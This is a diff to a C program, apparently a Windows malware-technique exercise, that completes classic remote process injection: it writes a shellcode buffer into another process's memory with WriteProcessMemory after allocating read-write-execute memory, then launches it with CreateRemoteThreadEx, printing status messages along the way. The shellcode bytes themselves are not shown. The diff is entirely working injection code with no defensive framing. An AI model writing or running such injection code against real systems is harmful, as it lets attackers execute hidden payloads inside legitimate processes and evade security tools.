@@ -6,7 +6,7 @@ const char* OK = "[+]";
 const char* INFO = "[*]";
 const char* ERR = "[-]";
 
-DWORD PID = NULL;
+DWORD PID, TID = NULL;
 HANDLE hProcess, hThread = NULL;
 LPVOID rBuffer = NULL;
 
@@ -40,5 +40,24 @@ int main(int argc, char* argv[])
 
 	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shlcd), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE perms\n", OK, sizeof(shlcd));
+
+	WriteProcessMemory(hProcess, rBuffer, shlcd, sizeof(shlcd), NULL);
+	printf("% s wrote %zu -bytes to process memory\n", OK, sizeof(shlcd));
+
+	/*thread to run the payload*/
+
+	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
+
+	if (hThread == NULL)
+	{
+		printf("%s couldn't get a handle to the thread (%ld) error: %ld", ERR, TID, GetLastError());
+		CloseHandle(hProcess);
+		return EXIT_FAILURE;
+	}
+	printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", OK, TID, hThread);
+
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+
 	return EXIT_SUCCESS;
 }
